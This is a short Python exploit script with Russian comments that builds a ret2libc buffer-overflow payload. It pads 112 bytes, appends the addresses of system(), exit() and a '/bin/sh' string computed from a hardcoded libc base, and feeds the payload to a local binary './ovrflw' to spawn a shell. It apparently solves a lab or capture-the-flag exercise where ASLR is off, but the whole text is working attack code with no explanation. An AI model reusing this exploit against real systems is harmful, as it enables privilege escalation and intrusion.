#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python exploit_no_aslr.py

import struct
from subprocess import call


def little_endian(num):
	"""Упаковка адреса в формат little endian."""
	return struct.pack('<I', num)


junk = "A" * 112

libc_addr = 0xb7e09000

system_offset = 0x0003ada0
exit_offset = 0x0002e9d0
sh_offset = 0x0015ba0b

system_addr = little_endian(libc_addr + system_offset)
exit_addr = little_endian(libc_addr + exit_offset)
sh_addr = little_endian(libc_addr + sh_offset)

payload = junk + system_addr + exit_addr + sh_addr

call(['./ovrflw', payload])
